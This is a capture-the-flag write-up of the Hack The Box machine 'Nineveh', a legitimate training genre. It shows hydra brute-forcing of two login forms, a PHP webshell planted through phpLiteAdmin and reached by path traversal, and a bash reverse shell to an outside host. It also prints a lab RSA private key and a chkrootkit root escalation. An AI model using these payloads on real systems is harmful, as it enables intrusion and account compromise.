# NINEVEH

## NMAP

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/nineveh]
└─$ nmap 10.10.10.43
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-14 02:31 EDT
Nmap scan report for 10.10.10.43
Host is up (0.18s latency).
Not shown: 998 filtered ports
PORT    STATE SERVICE
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 18.60 seconds
                                                                                                                                                                              
┌──(kali㉿kali)-[~/Downloads/hackthebox/nineveh]
└─$ nmap 10.10.10.43 -p 80,443 -A
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-14 02:32 EDT
Nmap scan report for 10.10.10.43
Host is up (0.18s latency).

PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
```

## PORT 80

![](https://github.com/Leo-2807/Writeups/blob/main/images/nineveh1.png)

### GOBUSTER

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/nineveh]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.43 -q -t 100 -k -x php,txt,html 
/index.html           (Status: 200) [Size: 178]
/info.php             (Status: 200) [Size: 83694]
/department           (Status: 301) [Size: 315] [--> http://10.10.10.43/department/]
/server-status        (Status: 403) [Size: 299] 
```

## /DEPARMENT

![](https://github.com/Leo-2807/Writeups/blob/main/images/nineveh4.png)

### SOURCE CODE

![](https://github.com/Leo-2807/Writeups/blob/main/images/nineveh5.png)

## DEPARMENT LOGIN

Trying some usernames I find that on using the username `admin` The message that comes is `Invalid Password!` which means that the username admin is correct 

To find the password I use hydra 

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/nineveh]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password!""
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-09-14 06:35:16
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344400 login tries (l:1/p:14344400), ~896525 tries per task
[DATA] attacking http-post-form://10.10.10.43:80/department/login.php:username=^USER^&password=^PASS^:Invalid Password
[STATUS] 1127.00 tries/min, 1127 tries in 00:01h, 14343273 to do in 212:07h, 16 active
[STATUS] 1132.67 tries/min, 3398 tries in 00:03h, 14341002 to do in 211:02h, 16 active
[80][http-post-form] host: 10.10.10.43   login: admin   password: 1q2w3e4r5t
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-09-14 06:39:20
```

So the credentials for department login are `admin:1q2w3e4r5t`

## MANAGE.PHP

![](https://github.com/Leo-2807/Writeups/blob/main/images/nineveh6.png)

On clicking the notes button some text appears below the image and the url changes to `http://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt` which makes me think of a possible lfi vulnerability

![](https://github.com/Leo-2807/Writeups/blob/main/images/nineveh7.png)


## PORT 443

![](https://github.com/Leo-2807/Writeups/blob/main/images/nineveh2.png)

### GOBUSTER

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/nineveh]
└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u https://10.10.10.43 -q -t 100 -k    
/.htpasswd            (Status: 403) [Size: 296]
/.htaccess            (Status: 403) [Size: 296]
/.hta                 (Status: 403) [Size: 291]
/db                   (Status: 301) [Size: 309] [--> https://10.10.10.43/db/]
/index.html           (Status: 200) [Size: 49]                               
/server-status        (Status: 403) [Size: 300]  
```

## /DB

![](https://github.com/Leo-2807/Writeups/blob/main/images/nineveh3.png)

`phpLiteAdmin is a web-based SQLite database admin tool written in PHP with support for SQLite2 and SQLite3.`

## PHPLITEADMIN LOGIN

Since in the previous form we had to bruteforce the password I thought maybe the same was to be done here. So I used hydra to bruteforce it.

```bash 
┌──(kali㉿kali)-[~/Downloads/hackthebox/nineveh]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password." -t 64 
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-09-14 07:54:59
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344400 login tries (l:1/p:14344400), ~224132 tries per task
[DATA] attacking http-post-forms://10.10.10.43:443/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password.
[443][http-post-form] host: 10.10.10.43   login: admin   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-09-14 07:55:51
```

![](https://github.com/Leo-2807/Writeups/blob/main/images/nineveh8.png)

## EXPLOIT

I used this [exploit](https://www.exploit-db.com/exploits/24044) to get rce

So first I created a database `aaaa.php` and made a table `payload` with the row entry `<?php system($_REQUEST["cmd"]);?> `

![](https://github.com/Leo-2807/Writeups/blob/main/images/nineveh9.png) 

Then I used the lfi that we found on the department page to access this webshell.

It took me some time and a lot of tries to get it right.

Okay, so the page is checking for a key word `ninevehNotes` and if it is not there the page displays `no notes selected` 

This is what I used to accedd my webshell
`http://10.10.10.43/department/manage.php?notes=/ninevehNotes/../var/tmp/aaaa.php&cmd=id`

![](https://github.com/Leo-2807/Writeups/blob/main/images/nineveh10.png)

## SHELL

I use the url encoded shell `bash -c 'bash -i >%26 /dev/tcp/10.10.14.24/443 0>%261'`

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/nineveh]
└─$ nc -lvnp 4444   
listening on [any] 4444 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.43] 52296
bash: cannot set terminal process group (1383): Inappropriate ioctl for device
bash: no job control in this shell
www-data@nineveh:/var/www/html/department$ whoami
whoami
www-data
```

After enumerating the system for a while I found `secure_notes` directory in which there was just an image 

Since the previous `ninevehNotes.txt` suggested to view some secret file. Maybe this was what it was talking about.

```bash
www-data@nineveh:/var/www/ssl$ cd secure_notes
cd secure_notes
www-data@nineveh:/var/www/ssl/secure_notes$ ls
ls
index.html  nineveh.png
```

There is a image on which when I used strings it gave me a ssh key

```bash
www-data@nineveh:/var/www/ssl/secure_notes$ strings nineveh.png
...snip...
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
-----END RSA PRIVATE KEY-----
```

## SSH

After reading about port knocking a little bit I found that there has to be a sequence of ports that I need to request for that perticular port to open

So with our lfi I tried to view the `/etc/knockd.conf` file to know the sequence for this machine

![](https://github.com/Leo-2807/Writeups/blob/main/images/nineveh11.png)

Then I used knock to request the ports in the given sequence

`knock 10.10.10.43 571 290 911 `

On doing nmap scan I found port 22 open

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/nineveh]
└─$ nmap 10.10.10.43
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-14 08:48 EDT
Nmap scan report for nineveh.htb (10.10.10.43)
Host is up (0.17s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```
Using the rsa key that we got I was able to ssh into the machine as amrois

## USER.TXT

```bash
┌──(kali㉿kali)-[~/Downloads/hackthebox/nineveh]
└─$ ssh -i id_rsa amrois@10.10.10.43
Ubuntu 16.04.2 LTS
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

288 packages can be updated.
207 updates are security updates.


You have mail.
Last login: Tue Sep 14 01:11:35 2021 from 10.10.14.31
amrois@nineveh:~$ ls
user.txt
amrois@nineveh:~$ cat user.txt
286e3c9161ce6c62cc6d39f8040750b5
```

## ROOT.TXT


On using linpeas I found that a bash script `/usr/sbin/report-reset.sh` is being run every minute.

```bash
amrois@nineveh:/usr/sbin$ cat report-reset.sh
#!/bin/bash

rm -rf /report/*.txt
```

It makes a report of process which are being changed and saves the report in `/report` directory

ON viewing one of the reports the line `Checking 'wted'... not tested: can't exec ./chkwtmp` lead me to search for `chkwtmp` . I found that it is a prt of `chkrootkit`.

This script is using chkrootkit , which on doing a quick google search I find is vulnerable and can be exploited via this [exploit](https://www.exploit-db.com/exploits/33899)

We will make a `update` file in `/tmp` directory 

```bash
amrois@nineveh:/tmp$ cat update
#!/bin/bash

cat /root/root.txt > /home/amrois/root.txt
```
After a minute we get the root.txt

```bash
amrois@nineveh:/tmp$ cat ~/root.txt
25f267a7074c5102831c52982193e013
```

We can also write a reverse shell to the update file to get a shell as root.